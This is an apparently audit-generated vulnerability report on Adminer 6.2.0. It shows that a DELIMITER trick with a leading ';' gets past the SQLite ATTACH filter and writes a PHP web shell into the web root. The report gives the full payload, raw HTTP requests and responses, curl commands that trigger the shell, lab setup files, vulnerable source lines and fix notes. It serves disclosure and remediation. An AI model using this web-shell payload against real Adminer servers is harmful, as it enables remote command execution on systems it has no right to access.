### Vulnerability details

**Official website / Product:** https://www.adminer.org/

**Repository:** vrana/adminer (stars at selection: 7943)

**Vulnerability type:** RCE / getshell

**Vulnerability versions:** Adminer 6.2.0 (tag `v6.2.0`, commit `f21cc90847465d7bd850725c42896c95bb360891`); same sinks on current `main`. Exploitable with **PDO_SQLite on PHP < 8.5** (no `PDO::setAuthorizer`). Native SQLite3 (PHP 8.0+ authorizer) blocks the same payload.

**Vulnerability URL / Parameter:** `POST /?ext=pdo&sqlite=&username=&db=<sqlite-file>&sql=` form field `query` (after `DELIMITER` changes the statement separator, a leading `;` bypasses the ATTACH/VACUUM INTO filter)

**Complex:** yes

### Verification procedure

1. Original lab path `labs/adminer-r36-a4/` (container `adminer-r36-a4`, image `adminer-r36-a4:6.2.0`, host **21604→80**). The image was removed after audit (`lab_images_removed` in `logs/merged/r36-a4.json`). If that directory is absent, rebuild with the equivalent `Dockerfile` + `docker-compose.yml` + `adminer-plugins.php` below (use in-tree `repos/adminer/adminer-6.2.0.php`, or the compiled artifact for tag `v6.2.0` / commit `f21cc90847465d7bd850725c42896c95bb360891`).
2. `docker compose up -d --build`; confirm `0.0.0.0:21604->80/tcp`; open `http://127.0.0.1:21604/?ext=pdo`.
3. Log in (Password plugin password `labpass`): System=SQLite, Server empty, Username empty, Password=`labpass`, Database=`/var/www/html/lab.db`. Take `adminer_sid` / `adminer_key` from `Set-Cookie`; copy the current CSRF `token` from the SQL command form hidden field (Cookie/token values in the PoC below are a captured lab session — replace with a live login session when reproducing).
4. Confirm PDO_SQLite; plain `ATTACH DATABASE '/tmp/x.db' AS p` is rejected (“ATTACH queries are not supported.”).
5. On SQL command submit:
   ```
   DELIMITER $$
   ;ATTACH DATABASE '/var/www/html/r36a4-shell.php' AS p$$
   CREATE TABLE p."<?php echo 'R36A4_RCE_OK'; if(isset($_GET['c'])){echo shell_exec($_GET['c']);} ?>" (x)$$
   DELIMITER ;
   ```
6. Two “Query executed OK” messages; `GET /r36a4-shell.php?c=id` returns a SQLite byte stream in which PHP execution embeds `R36A4_RCE_OK` and `uid=33(www-data)` (see PoC §2 parsed proof below).
7. Control: without `ext=pdo` (SQLite3) the same payload yields `Error in query (23): not authorized` and no shell file.

Equivalent lab files (when `labs/adminer-r36-a4/` is missing):

`Dockerfile`:

```dockerfile
FROM php:8.3-apache-bookworm
RUN docker-php-ext-install pdo_sqlite \
 && apt-get update && apt-get install -y --no-install-recommends libsqlite3-dev \
 && docker-php-ext-install sqlite3 \
 && rm -rf /var/lib/apt/lists/*
COPY adminer-6.2.0.php /var/www/html/index.php
COPY adminer-plugins.php /var/www/html/adminer-plugins.php
RUN sqlite3 /var/www/html/lab.db "CREATE TABLE t(i INTEGER); INSERT INTO t VALUES (1);" \
 && chown -R www-data:www-data /var/www/html
```

`adminer-plugins.php` (example `password_hash('labpass', PASSWORD_DEFAULT)`; or generate via Adminer’s plugin wizard):

```php
<?php
return array(
	new Adminer\Password('$2y$12$B.Hbx8F3Rh.XxooKHcHb1eg6Tf.vKqftzUWqv88KfqZBL5Cpe1X5C'),
);
```

`docker-compose.yml`:

```yaml
services:
  adminer:
    build: .
    image: adminer-r36-a4:6.2.0
    container_name: adminer-r36-a4
    ports:
      - "21604:80"
```

### Complete vulnerability PoC

#### 1) SQL command: DELIMITER + `;ATTACH` bypass and shell write

Complete HTTP request (Docker-verified). Replace `Cookie` / `token` with a live login session:

```http
POST /?ext=pdo&sqlite=&username=&db=/var/www/html/lab.db&sql= HTTP/1.1
Host: 127.0.0.1:21604
User-Agent: r36-a4-adminer-audit/1.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: identity
Connection: close
Content-Type: application/x-www-form-urlencoded
Cookie: adminer_sid=fadb3f2d4d0c86b2544107c05a2b2d8c; adminer_key=846c5fab662bd275a51195e8f2b67661
Content-Length: 307

query=DELIMITER+%24%24%0A%3BATTACH+DATABASE+%27%2Fvar%2Fwww%2Fhtml%2Fr36a4-shell.php%27+AS+p%24%24%0ACREATE+TABLE+p.%22%3C%3Fphp+echo+%27R36A4_RCE_OK%27%3B+if%28isset%28%24_GET%5B%27c%27%5D%29%29%7Becho+shell_exec%28%24_GET%5B%27c%27%5D%29%3B%7D+%3F%3E%22+%28x%29%24%24%0ADELIMITER+%3B&token=425641%3A411883
```

URL-decoded `query` plaintext (equivalent to the body above):

```
DELIMITER $$
;ATTACH DATABASE '/var/www/html/r36a4-shell.php' AS p$$
CREATE TABLE p."<?php echo 'R36A4_RCE_OK'; if(isset($_GET['c'])){echo shell_exec($_GET['c']);} ?>" (x)$$
DELIMITER ;
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
Date: Mon, 02 Nov 2026 02:24:25 GMT
Server: Apache/2.4.68 (Debian)
X-Powered-By: PHP/8.3.36
Cache-Control: no-cache
X-Frame-Options: deny
X-XSS-Protection: 0
X-Content-Type-Options: nosniff
Referrer-Policy: origin-when-cross-origin
Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-ODdlMGZmMTU2ZDY2MzUwNTg2MGM4Yzk4ZDE1OGFhY2I=' 'strict-dynamic'; connect-src 'self' https://www.adminer.org; frame-src https://www.adminer.org; object-src 'none'; base-uri 'none'; form-action 'self'
Vary: Accept-Encoding
Connection: close
Transfer-Encoding: chunked
Content-Type: text/html; charset=utf-8

82b
<!DOCTYPE html>
<html lang='en' dir='ltr' class='ltr nojs'>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta name="robots" content="noindex">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>SQL command - Adminer</title>
<link rel="stylesheet" href="?file=default.css&amp;version=6.2.0+a1c9160e">
<link rel='stylesheet' media='(prefers-color-scheme: dark)' href='?file=dark.css&amp;version=6.2.0+a1c9160e'>
<meta name='color-scheme' content='light dark'>
<script src='?file=functions.js&amp;version=6.2.0+a1c9160e' nonce="ODdlMGZmMTU2ZDY2MzUwNTg2MGM4Yzk4ZDE1OGFhY2I="></script>
<link rel='icon' href='data:image/gif;base64,R0lGODlhEAAQAJEAAAQCBPz+/PwCBAROZCH5BAEAAAAALAAAAAAQABAAAAI2hI+pGO1rmghihiUdvUBnZ3XBQA7f05mOak1RWXrNq5nQWHMKvuoJ37BhVEEfYxQzHjWQ5qIAADs='>
<link rel='apple-touch-icon' href='?file=logo.svg&amp;version=6.2.0+a1c9160e'>
<link rel='manifest' href='?manifest=' crossorigin='use-credentials'>

<body class=' adminer'>
<script nonce="ODdlMGZmMTU2ZDY2MzUwNTg2MGM4Yzk4ZDE1OGFhY2I=">onload = partial(verifyVersion, '6.2.0');

const offlineMessage = 'You are offline.';
const numberFormat = '#,##0';
const numberDigits = '0123456789';
const urlSeparators = '&';</script>
<div id='help' class='jush-sqlite jsonly hidden' data-onmouseover='helpKeep()' data-onmouseout='helpMouseout()'></div>
<div id='content'>
<span id='menuopen' class='jsonly' data-onclick='menuToggle()'><button title='Menu' class='icon icon-move' aria-expanded='false'></button></span>
<p id="breadcrumb"><a href="?ext=pdo&amp;sqlite=">SQLite</a> » <a href='?ext=pdo&amp;sqlite=&amp;username=' accesskey='1' title='Alt+Shift+1'>Server</a> » <a href="?ext=pdo&amp;sqlite=&amp;username=&amp;db=/var/www/html/lab.db">/var/www/html/lab.db</a> » SQL command
<h2>SQL command</h2>
<div id='ajaxstatus' role='status' class='jsonly'></div>
<script nonce="ODdlMGZmMTU2ZDY2MzUwNTg2MGM4Yzk4ZDE1OGFhY2I=">if (navigator.serviceWorker) {
	navigator.serviceWorker.register('?file=worker.js&version=6.2.0+a1c9160e', {scope: location.pathname}).catch(() => {});
}</script>

77
<pre id='sql-1'><code class='jush-sqlite'>;ATTACH DATABASE &#039;/var/www/html/r36a4-shell.php&#039; AS p</code></pre>

1c1
<p class='message' title=''>Query executed OK, 0 rows affected. <span class='time'>(0.000 s)</span> <a href='?ext=pdo&amp;sqlite=&amp;username=&amp;db=/var/www/html/lab.db&amp;sql=;ATTACH+DATABASE+%27/var/www/html/r36a4-shell.php%27+AS+p'>Edit</a>
<pre id='sql-2'><code class='jush-sqlite'>CREATE TABLE p.&quot;&lt;?php echo &#039;R36A4_RCE_OK&#039;; if(isset($_GET[&#039;c&#039;])){echo shell_exec($_GET[&#039;c&#039;]);} ?>&quot; (x)</code></pre>

181f
<p class='message' title=''>Query executed OK, 0 rows affected. <span class='time'>(0.002 s)</span> <a href='?ext=pdo&amp;sqlite=&amp;username=&amp;db=/var/www/html/lab.db&amp;sql=CREATE+TABLE+p.%22%3C%3Fphp+echo+%27R36A4_RCE_OK%27;+if(isset($_GET[%27c%27])){echo+shell_exec($_GET[%27c%27]);}+%3F%3E%22+(x)'>Edit</a>

<form action="" method="post" enctype="multipart/form-data" id="form" data-onsubmit='sqlSubmit("?ext=pdo&amp;sqlite=&amp;username=&amp;db=\/var\/www\/html\/lab.db", 2000)'>
<p><textarea name='query' rows='20' cols='80' class='sqlarea jush-sqlite' spellcheck='false' wrap='off'>
DELIMITER $$
;ATTACH DATABASE &#039;/var/www/html/r36a4-shell.php&#039; AS p$$
CREATE TABLE p.&quot;&lt;?php echo &#039;R36A4_RCE_OK&#039;; if(isset($_GET[&#039;c&#039;])){echo shell_exec($_GET[&#039;c&#039;]);} ?>&quot; (x)$$
DELIMITER ;</textarea><p><input type='submit' value='Execute' title='Ctrl+Enter'>
Limit rows: <input type='number' name='limit' class='size' value=''>
<label><input type='checkbox' name='error_stops' value='1'>Stop on error</label>
<label><input type='checkbox' name='only_errors' value='1'>Show only errors</label>
<input type='hidden' name='token' value='355775:351229'>
<fieldset><legend><a href='#fieldset-history' class='toggle'>History</a></legend><div id='fieldset-history' class='hidden'>
<div><a href="?ext=pdo&amp;sqlite=&amp;username=&amp;db=/var/www/html/lab.db&amp;sql=&amp;history=0" class="hover">Edit</a> <span class='time' title='2026-11-02'>02:24:25</span> <code class='sql jush-sqlite'>DELIMITER $$ ;ATTACH DATABASE &#039;/var/www/html/r36a4-shell.php&#039; AS p$$ CREATE TABL</code><i>…</i></div>
<input type='submit' name='clear' value='Clear'>
<a href='?ext=pdo&amp;sqlite=&amp;username=&amp;db=/var/www/html/lab.db&amp;sql=&amp;history=all'>Edit all</a>
</div></fieldset>
</form>
</div>

<div id='foot' class='foot'>
<div id='menu'>
<h1><a href='https://www.adminer.org/' target="_blank" rel="noreferrer noopener" id='h1'><img src='?file=logo.svg&amp;version=6.2.0+a1c9160e' width='24' height='24' alt='' id='logo'>Adminer</a> <span class='version'>6.2.0 <a href='https://www.adminer.org/#download' target="_blank" rel="noreferrer noopener" id='version'><noscript><iframe sandbox src='https://www.adminer.org/version/?current=6.2.0&amp;noscript=1'></iframe></noscript></a></span></h1>
<form action='' method='post'>
<div id='lang'><label>Language: <select name='lang' data-onchange='formSubmit()'><option value="en" selected>English<option value="id">Bahasa Indonesia<option value="ms">Bahasa Melayu<option value="bs">Bosanski<option value="ca">Català<option value="cs">Čeština<option value="da">Dansk<option value="de">Deutsch<option value="et">Eesti<option value="es">Español<option value="fr">Français<option value="gl">Galego<option value="hr">Hrvatski<option value="it">Italiano<option value="lv">Latviešu<option value="lt">Lietuvių<option value="ro">Limba Română<option value="hu">Magyar<option value="nl">Nederlands<option value="no">Norsk<option value="uz">Oʻzbekcha<option value="pl">Polski<option value="pt">Português<option value="pt-br">Português (Brazil)<option value="sk">Slovenčina<option value="sl">Slovenski<option value="fi">Suomi<option value="sv">Svenska<option value="vi">Tiếng Việt<option value="tr">Türkçe<option value="bg">Български<option value="el">Ελληνικά<option value="ru">Русский<option value="sr">Српски<option value="uk">Українська<option value="he">עברית<option value="ar">العربية<option value="fa">فارسی<option value="hi">हिन्दी<option value="bn">বাংলা<option value="ta">த‌மிழ்<option value="th">ภาษาไทย<option value="ka">ქართული<option value="ja">日本語<option value="zh">简体中文<option value="zh-tw">繁體中文<option value="ko">한국어</select></label> <input type='submit' value='Use' class='hidden'>
<input type='hidden' name='token' value='168576:173250'>
</div>
</form>
<script src='?file=jush.js&amp;version=6.2.0+a1c9160e' nonce="ODdlMGZmMTU2ZDY2MzUwNTg2MGM4Yzk4ZDE1OGFhY2I=" defer></script>
<script nonce="ODdlMGZmMTU2ZDY2MzUwNTg2MGM4Yzk4ZDE1OGFhY2I=">
var jushLinks = { sqlite:{
	"?ext=pdo&sqlite=&username=&db=\/var\/www\/html\/lab.db&table=$&": /\b(?<!\$)(t)(?!\$)\b/g
}
};
jushLinks.bac = jushLinks.sqlite;
jushLinks.bra = jushLinks.sqlite;
jushLinks.sqlite_quo = jushLinks.sqlite;
jushLinks.mssql_bra = jushLinks.sqlite;
addEventListener('DOMContentLoaded', () => { autocompleter = jush.autocompleteSql('""', {"t":["i"]}, null); });
</script>
<script nonce="ODdlMGZmMTU2ZDY2MzUwNTg2MGM4Yzk4ZDE1OGFhY2I=">syntaxHighlighting('3.4', '');</script>
<form action=''>
<p id='dbs'>
<input type='hidden' name='ext' value='pdo'>
<input type='hidden' name='sqlite' value=''>
<input type='hidden' name='username' value=''>
<label title='Database'>DB: <input name='db' value='/var/www/html/lab.db' autocapitalize='off' size='19'>
</label><input type='submit' value='Use'>
<input type='hidden' name='sql' value=''>
</p></form>
<p class='links'>
<a href='?ext=pdo&amp;sqlite=&amp;username=&amp;db=/var/www/html/lab.db&amp;sql=' class='active '>SQL command</a>
<a href='?ext=pdo&amp;sqlite=&amp;username=&amp;db=/var/www/html/lab.db&amp;import='>Import</a>
<a href='?ext=pdo&amp;sqlite=&amp;username=&amp;db=/var/www/html/lab.db&amp;dump=' id='dump'>Export</a>
<a href="?ext=pdo&amp;sqlite=&amp;username=&amp;db=/var/www/html/lab.db&amp;create=">Create table</a>
<ul id='tables' data-onmouseover='menuOver()' data-onmouseout='menuOut()'><li><a href="?ext=pdo&amp;sqlite=&amp;username=&amp;db=/var/www/html/lab.db&amp;select=t" class='select hover' title='Select data'>select</a> <a href="?ext=pdo&amp;sqlite=&amp;username=&amp;db=/var/www/html/lab.db&amp;table=t" class='structure' title='Show structure'>t</a>
</ul>
</div>
<form action="" method="post">
<p class="logout">
<span title="Username">
</span>
<input type='submit' name='logout' value='Logout' id='logout'>
<input type='hidden' name='token' value='794920:792426'>
</form>
</div>

<script nonce="ODdlMGZmMTU2ZDY2MzUwNTg2MGM4Yzk4ZDE1OGFhY2I=">setupSubmitHighlight(document);</script>

0
```

#### 2) Getshell: hit the written SQLite/PHP file

Complete HTTP request:

```http
GET /r36a4-shell.php?c=id HTTP/1.1
Host: 127.0.0.1:21604
User-Agent: r36-a4-adminer-audit/1.0
Accept: */*
Connection: close
```

Complete HTTP response headers:

```http
HTTP/1.1 200 OK
Date: Mon, 02 Nov 2026 02:24:25 GMT
Server: Apache/2.4.68 (Debian)
X-Powered-By: PHP/8.3.36
Vary: Accept-Encoding
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8
```

Response body is raw SQLite 3 database bytes (~8147 bytes; `file` reports `SQLite 3.x database`). The ATTACH/CREATE TABLE steps above write that file under the web root; on reproduce, `curl -sS 'http://127.0.0.1:21604/r36a4-shell.php?c=id' -o /tmp/r36a4-shell.bin` yields the same binary — no side file is required. PHP executes the `<?php ... ?>` embedded in the table name while streaming the file, so printable extracts contain both the marker and `id` output. Docker-lab parsed proof:

```
file=/var/www/html/r36a4-shell.php
marker_R36A4_RCE_OK=True
uid_present=True
printable=SQLite format 3@  .c//UtableR36A4_RCE_OKuid=33(www-data) gid=33(www-data) groups=33(www-data)R36A4_RCE_OKuid=33(www-data) gid=33(www-data) groups=33(www-data)CREATE TABLE "R36A4_RCE_OKuid=33(www-data) gid=33(www-data) groups=33(www-data)" (x)
```

Extract printable proof from the response body (expect both `R36A4_RCE_OK` and `uid=33(www-data)`):

```bash
curl -sS 'http://127.0.0.1:21604/r36a4-shell.php?c=id' | tr -cd '\11\12\15\40-\176'
# or: curl -sS 'http://127.0.0.1:21604/r36a4-shell.php?c=id' | strings
```

Verification result notes:

- Filter bypass: response shows `;ATTACH DATABASE '/var/www/html/r36a4-shell.php' AS p` with **Query executed OK** (not “ATTACH queries are not supported.”).
- Arbitrary file write: `/var/www/html/r36a4-shell.php` (SQLite DB embedding `<?php ... shell_exec ... ?>` in a table name).
- Getshell: `GET /r36a4-shell.php?c=id` → body contains `R36A4_RCE_OK` and `uid=33(www-data) gid=33(www-data) groups=33(www-data)` (see parsed proof above).

### Vulnerability analysis

Adminer’s SQL command page blocks SQLite `ATTACH` / `VACUUM INTO` with a regex (`$space` covers whitespace, BOM, comments). Native SQLite3 also installs `setAuthorizer` on PHP 8.0+ to deny `SQLITE_ATTACH`.

Failure mode:

1. **`DELIMITER`** (honored for every driver in `adminer/sql.inc.php`) lets `;ATTACH ...` become a single `$q`.
2. The regex requires the keyword after only `$space`; **`;` is not in `$space`**, so `preg_match` returns 0 and the filter allows the statement.
3. PDO runs `;ATTACH ...`; SQLite accepts the leading `;`. On PHP 8.3, PDO_SQLite has **no** authorizer (`setAuthorizer` only at PHP 8.5+ per Adminer), so the defense fails.
4. Writing a SQLite file with PHP in a table name under the web root yields getshell. This is a bypass of an **explicit security control**, not intended SQL admin power.

### Trigger / sink source (full path and line numbers)

```php
# File: adminer/sql.inc.php
# Lines: 152-175 and 233-266
152|		$space = "(?:\\s|\xEF\xBB\xBF|/\\*[\s\S]*?\\*/|(?:$line_comment)[^\n]*\n?|--\r?\n)"; // BOM - SQLite skips it
153|		$offset = 0;
154|		$query_offset = 0; // the position of $query in the <textarea>
155|		$empty = true;
156|		$copy = false; // PostgreSQL COPY ... FROM stdin
157|		$meta = false; // psql \connect
158|		$connection2 = connect(); // connection for exploring indexes and EXPLAIN (to not replace FOUND_ROWS()) //! PDO - silent error
159|		if ($connection2 && DB != "") {
160|			$connection2->select_db(DB);
161|			if ($_GET["ns"] != "") {
162|				set_schema($_GET["ns"], $connection2);
163|			}
164|		}
165|		$commands = 0;
166|		$errors = array();
167|		$parse = '[\'"' . (JUSH == "sql" ? '`' : (JUSH == "sqlite" ? '`[' : (JUSH == "mssql" ? '[' : ''))) . ']|/\*|' . $line_comment . '|$' . (JUSH == "pgsql" ? '|\$([a-zA-Z]\w*)?\$' : '');
168|		$total_start = microtime(true);
169|
170|		while ($query != "") {
171|			if (!$offset && preg_match("~^$space*+DELIMITER\\s+(\\S+)~i", $query, $match)) {
172|				$delimiter = preg_quote($match[1]);
173|				$query = substr($query, strlen($match[0]));
174|				$query_offset += strlen($match[0]);
175|			} elseif (!$offset && JUSH == 'pgsql' && preg_match("~^($space*+COPY\\s+)[^;]+\\s+FROM\\s+stdin;~i", $query, $match)) {
233|						$commands++;
234|						$print = "<pre id='sql-$commands'>$code</pre>\n";
235|						if (JUSH == "sqlite" && preg_match("~^$space*+(ATTACH|VACUUM\\b.*\\bINTO)\\b~is", $q, $match) !== 0) {
236|							// PHP doesn't support setting SQLITE_LIMIT_ATTACHED
237|							echo $print;
238|							echo "<p class='error'>" . lang('%s queries are not supported.', preg_match('~ATTACH~i', $match[1]) ? 'ATTACH' : 'VACUUM INTO') . "\n";
239|							$errors[] = " <a href='#sql-$commands'>$commands</a>";
240|							if (!$error_line && !isset($_GET["import"])) {
241|								$error_line = query_error_line($_POST["query"], $q_offset, $q, 0);
242|							}
243|							if ($_POST["error_stops"]) {
244|								break;
245|							}
246|						} else {
247|							if (!$_POST["only_errors"]) {
248|								echo $print;
249|								ob_flush();
250|								flush(); // can take a long time - show the running query
251|							}
252|							$start = microtime(true);
253|							//! don't allow changing of character_set_results, convert encoding of displayed query
254|							if (JUSH == "pgsql" && preg_match("~^$space*+\\\\connect\\s+(\"(?:[^\"]|\"\")+\"|[^\\s\";]+)\\s*;*\\s*\$~", $q, $match)) { // trailing semicolons are ignored like in psql
255|								$db = idf_unescape($match[1]);
256|								if (connection()->select_db($db)) {
257|									if ($connection2) {
258|										$connection2->select_db($db);
259|									}
260|									echo ($_POST["only_errors"] ? "" : "<p class='message'>" . lang('Database') . ": " . h($db) . " <span class='time'>(" . format_time($start) . ")</span>\n");
261|									continue;
262|								}
263|								// the error set by select_db() is printed below
264|							} elseif (connection()->multi_query($q) && $connection2 && preg_match("~^$space*+USE\\b~i", $q)) {
265|								$connection2->query($q);
266|							}
```

```php
# File: adminer/drivers/sqlite.inc.php
# Lines: 72-82 and 143-147
72|	} elseif (extension_loaded("pdo_sqlite")) {
73|		abstract class SqliteDb extends PdoDb {
74|			public $extension = "PDO_SQLite";
75|
76|			function attach(array $server, string $username, string $password): string {
77|				$return = $this->dsn(DRIVER . ":" . $server["path"], "", "", array(), (class_exists('Pdo\Sqlite') ? 'Pdo\Sqlite' : 'PDO'));
78|				if (!$return && method_exists($this->pdo, 'setAuthorizer')) { // PHP 8.5+
79|					$this->pdo->setAuthorizer(array($this, 'authorize'));
80|				}
81|				return $return;
82|			}
143|			/** Deny attaching a file, also used by VACUUM INTO */
144|			function authorize(int $action, ?string $arg1): int {
145|				// 24 - SQLITE_ATTACH, '' is a temporary database used also by VACUUM
146|				return ($action != 24 || $arg1 === '' || $this->attaching ? 0 : 1); // SQLITE_OK, SQLITE_DENY
147|			}
```

### Fix notes

1. Normalize each statement before the regex (strip leading `;`, whitespace, BOM, comments) or reject any statement whose normalized form starts with ATTACH/VACUUM INTO.
2. Disable `DELIMITER` for SQLite, or still scan for dangerous keywords under a custom delimiter.
3. On PDO_SQLite, enable `setAuthorizer` on PHP ≥ 8.5; on older PHP refuse PDO_SQLite or add an equivalent PHP-layer guard.
4. Prefer authorizer / path allowlists over regex alone.
